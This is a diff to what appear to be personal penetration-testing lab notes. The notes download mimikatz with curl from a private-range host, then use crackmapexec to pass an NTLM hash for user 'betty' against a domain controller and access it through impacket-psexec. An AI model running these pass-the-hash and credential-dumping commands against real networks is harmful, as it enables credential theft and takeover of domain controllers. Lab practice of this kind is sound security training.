@@ -111,6 +111,11 @@ https://github.com/gentilkiwi/mimikatz/releases
 
 curl http://192.168.49.102:443/mimikatz.exe -o mimikatz.exe
 
+tried cme smb on DC with betty hash 
+crackmapexec smb 192.168.102.100 -u betty -H fa680f1c00205958367965bd2102e92c 
+Pwned
+accessed DC using impacket-psexec
+
 
 
 
